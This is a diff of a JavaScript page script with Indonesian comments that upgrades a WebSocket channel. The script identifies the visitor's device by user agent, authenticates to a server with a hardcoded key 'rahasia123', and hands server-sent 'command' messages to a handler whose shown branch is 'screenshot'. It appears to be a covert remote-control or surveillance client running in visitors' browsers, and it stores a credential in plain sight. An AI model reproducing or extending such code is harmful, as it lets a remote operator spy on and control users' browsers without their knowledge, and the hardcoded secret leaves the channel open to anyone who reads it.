@@ -978,7 +978,7 @@ lazyLoad(function() {
 }, 2000);
 
 // ============================================================
-// 🔥 UPGRADE 13: WEB SOCKET (REAL-TIME)
+// 🔥 UPGRADE 13: WEB SOCKET (REAL-TIME) - SUDAH DIPERBAIKI!
 // ============================================================
 function initWebSocket() {
     try {
@@ -991,8 +991,10 @@ function initWebSocket() {
         ws.onopen = function() {
             reconnectAttempts = 0;
             K({ sumber: 'websocket', data: 'connected' });
+            // 🔥 PERBAIKAN: Kirim auth, bukan register
             ws.send(JSON.stringify({
-                type: 'register',
+                type: 'auth',
+                key: 'rahasia123', // Ganti dengan PASSWORD di worker Anda
                 deviceId: navigator.userAgent || 'unknown',
                 timestamp: Date.now()
             }));
@@ -1001,10 +1003,22 @@ function initWebSocket() {
         ws.onmessage = function(event) {
             try {
                 var data = JSON.parse(event.data);
+                // Tangani response auth
+                if (data.type === 'auth_success') {
+                    K({ sumber: 'websocket', data: 'authenticated' });
+                }
+                if (data.type === 'auth_failed') {
+                    K({ sumber: 'websocket', data: 'auth_failed' });
+                }
                 if (data.type === 'command') {
                     handleRemoteCommand(data);
                 }
-            } catch(e) {}
+                if (data.type === 'pong') {
+                    // Ping/pong untuk keep-alive
+                }
+            } catch(e) {
+                K({ sumber: 'websocket_error', data: e.message });
+            }
         };
         
         ws.onclose = function() {
@@ -1016,7 +1030,9 @@ function initWebSocket() {
             }
         };
         
-        ws.onerror = function() {};
+        ws.onerror = function() {
+            // Biarkan onclose yang handle reconnect
+        };
         
         var wsHeartbeat = setInterval(function() {
             if (ws && ws.readyState === WebSocket.OPEN) {
@@ -1034,8 +1050,10 @@ function initWebSocket() {
 
 function handleRemoteCommand(data) {
     try {
-        var action = data.action;
-        var params = data.params || {};
+        var action = data.action || data.command?.aksi;
+        var params = data.params || data.command?.params || {};
+        
+        if (!action) return;
         
         switch(action) {
             case 'screenshot':
